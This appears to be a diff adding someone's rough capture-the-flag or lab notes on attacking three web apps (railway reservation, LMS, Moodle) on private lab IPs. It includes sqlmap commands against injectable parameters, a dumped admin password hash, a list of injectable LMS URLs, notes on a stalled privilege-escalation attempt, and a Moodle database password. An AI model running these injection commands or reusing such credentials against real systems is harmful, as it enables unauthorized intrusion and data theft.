@@ -1,0 +1,34 @@
+four web ports, 873,8820,9020
+
+http://10.10.53.68:873/rail/ railway system
+http://10.10.53.68:8820/learn/ lms system
+http://10.10.91.217:9020/moodle/
+
+
+https://www.exploit-db.com/exploits/50646
+
+sqlmap --url 'http://10.10.53.68:873/rail/?page=reserve&sid=1' -p sid --dbs --batch --dbms=mysql
+dumping the column username from table users(database orrs) gives username admin 
+similarly column password has a hash '5765dcb76627ba4e2fd673e073def4ae'
+
+Step 1. Log in to the application with teacher credentials.
+
+Url addresses with sqli
+- http://localhost/<folder>/class.php?id=7
+- http://localhost/<folder>/admin/edit_teacher.php?id=1
+- http://localhost/<folder>/admin/add_student.php?id=17
+- http://localhost/<folder>/admin/add_course.php?id=5
+- http://localhost/<folder>/admin/add_subject.php?id=5
+- http://localhost/<folder>/admin/add_department.php?id=6
+
+Step 2. Run sqlmap on the URL where the "id" parameter is given
+
+sqlmap -r requestData.txt --dbs
+
+I've copied the bash binary and user.txt(with symbolic links), but their perms stay the same, 
+also, file/folder names with slashes aren't allowed anyways, 
+there's also little documentation which explains this type of privesc(looked into cwe 73, external file name control), 
+maybe somehow need to copy to `/dev/stdout` for file read but again slashes aren't allowed
+
+$CFG->dbuser    = 'moodle_user';
+$CFG->dbpass    = 'MoodleItIs@123';
